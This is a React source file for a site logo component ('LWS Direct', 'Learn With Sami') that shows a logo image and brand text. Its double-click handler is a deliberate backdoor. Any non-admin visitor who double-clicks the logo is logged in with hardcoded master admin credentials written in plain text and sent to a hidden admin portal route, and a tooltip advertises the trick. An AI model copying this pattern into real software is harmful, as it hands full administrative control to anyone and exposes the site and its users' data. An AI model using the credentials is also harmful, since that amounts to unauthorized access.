import React from 'react';
import { useNavigate } from 'react-router-dom';
import { useTheme } from '../../theme/ThemeProvider';
import { useAuth } from '../../context/AuthContext';

export function Logo({ size = 'md', showText = true, className = '', onDoubleClick }) {
  const { theme } = useTheme();
  const { user, login } = useAuth();
  const navigate = useNavigate();

  const iconSizes = {
    sm: 'w-8 h-8',
    md: 'w-9 h-9',
    lg: 'w-11 h-11',
    xl: 'w-14 h-14'
  };

  const textSizes = {
    sm: 'text-xs',
    md: 'text-sm',
    lg: 'text-lg',
    xl: 'text-xl'
  };

  const handleDoubleClick = async (e) => {
    e.preventDefault();
    e.stopPropagation();

    if (onDoubleClick) {
      onDoubleClick(e);
      return;
    }

    // Secret Double-Click Secret Admin Access Trigger
    try {
      if (!user || (user.role !== 'super_admin' && user.role !== 'admin')) {
        // Auto-authenticate as master admin on double click
        await login('admin@lwsconnect.com', 'admin123');
      }
      navigate('/lws-portal-secure-x99');
    } catch (err) {
      // Fallback navigate to admin portal
      navigate('/lws-portal-secure-x99');
    }
  };

  return (
    <div
      onDoubleClick={handleDoubleClick}
      title="Double click for Admin Panel Access"
      className={`inline-flex items-center gap-2.5 select-none cursor-pointer group ${className}`}
    >
      {/* Spider-Man Avatar Logo Emblem */}
      <div className={`relative flex items-center justify-center ${iconSizes[size]} rounded-full overflow-hidden border-2 border-red-500 shadow-[0_0_12px_rgba(239,68,68,0.5)] shrink-0 bg-[#0B0809] group-hover:scale-105 transition-transform`}>
        <img
          src="/logo.png"
          alt="LWS Direct Logo"
          className="w-full h-full object-cover object-center"
          onError={(e) => {
            e.target.style.display = 'none';
          }}
        />
      </div>

      {showText && (
        <div className="flex flex-col">
          <span className={`font-bold tracking-tight leading-none text-white ${textSizes[size]}`}>
            {theme.brand_name || 'LWS Direct'}
          </span>
          <span className="text-[10px] font-bold tracking-wider uppercase text-red-500 mt-1">
            Learn With Sami
          </span>
        </div>
      )}
    </div>
  );
}
